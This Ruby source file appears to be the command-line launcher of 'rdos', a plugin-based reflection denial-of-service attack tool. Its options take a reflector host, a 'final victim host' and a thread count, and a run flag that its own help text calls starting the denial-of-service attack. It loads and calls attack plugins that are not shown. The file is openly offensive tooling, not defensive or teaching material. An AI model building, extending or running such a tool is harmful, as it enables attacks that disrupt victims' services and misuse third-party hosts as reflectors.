#encoding: utf-8
#!/usr/bin/env ruby
# -*- coding: binary -*-
#

module RDOS
    rdosbase = __FILE__
    while File.symlink?(rdosbase)
        rdosbase = File.expand_path(File.readlink(rdosbase), File.dirname(rdosbase))
    end

    Rdosbase_dir = File.expand_path(File.dirname(rdosbase))
    Rdosbin_dir = File.expand_path(File.join(File.dirname(rdosbase), 'src'))

    $:.unshift(File.expand_path(File.join(File.dirname(rdosbase), 'lib')))

    require 'rdosenv'
    require 'plugin_base'

    #load plugin
    plugin_file_path = File.join(File.dirname(rdosbase), "plugin/*.rb")
    Dir[plugin_file_path].each do |plugin_file|
        load plugin_file
    end

    Plugin_class_hash = {}

    RDOS::PLUGIN.constants.each do |plugin|
        next if plugin == :Base
        Plugin_class_hash.update( {plugin.to_s.downcase => (RDOS::PLUGIN.class_eval plugin.to_s).new.init})
    end
end

require 'optparse'
class OptsConsole
  #
  # Return a hash describing the options.
  #
  def self.parse(args)
    options = {}

    opts = OptionParser.new do |opts|
      opts.banner = "Usage: rdos.rb [options] -p <插件名称> -R <反射主机> -T <最终受害主机> -r"

      opts.separator ""
      opts.separator "Specific options:"

      opts.on("-R", "--reflect <target server>", "反射主机") do |s|
        options['Reflect'] = s
      end

      opts.on("-T", "--target <target server>", "最终目标") do |s|
        options['Target'] = s
      end

      opts.on("-t", "--test", "测试目标主机") do
        options['Test'] = true
      end

      opts.on("-r", "--run", "开始拒绝服务攻击") do
        options['Run'] = true
      end

      opts.on("-l", "--list", "List plugin") do
        options['List'] = true
      end

      opts.on("-p", "-p <plugin>", "Use a plugin") do |p|
        options['Plugins'] = p.downcase
      end

      opts.on("--thread", "--thread <thread nummber>", "启动进程数量,默认为1") do |x|
        options['Thread'] = x
      end

      opts.on("-v", "--version", "Show version") do |v|
        options['Version'] = true
      end

      opts.separator ""
      opts.separator "Plugin options:"

      RDOS::Plugin_class_hash.keys.each do |k|
        opts.separator ""
        opts.separator "#{RDOS::Plugin_class_hash[k].name} - #{RDOS::Plugin_class_hash[k].desc}:"
        RDOS::Plugin_class_hash[k].args.each_pair do |k, v|
            opts.on(v[0], v[1], v[2]) do |vv|
                options[k] = vv
            end
        end
      end

      opts.separator ""
      opts.separator "Common options:"
      opts.on_tail("-h", "--help", "Show this message") do
        puts opts
        exit
      end
    end

    begin
      opts.parse!(args)
    rescue 
      puts "Invalid option, try -h for usage"
      exit
    end

    options
  end
end

module RDOS
    Options = OptsConsole.parse(ARGV)
end

options = RDOS::Options
plugin_class_hash = RDOS::Plugin_class_hash

if (options['Version'])
  $stderr.puts 'Rdos Version: ' + RDOS::Version
  exit
end

if (options['List'])
  $stderr.puts "Rdos active plugin: \n"
  plugin_class_hash.keys.each do |k|
    $stderr.puts "\t#{k}\n"
  end
  exit
end

if (options['Plugins'].nil?)
    puts "Invalid option, try -h for usage"
    exit
end

if (not plugin_class_hash.keys.include?(options['Plugins']))
    puts "Plugin not found, try -l for the list"
    exit
end

if (options['Test'])
    plugin_class_hash[options['Plugins']].test
    exit
end

if (options['Run'])
    plugin_class_hash[options['Plugins']].run
    exit
end
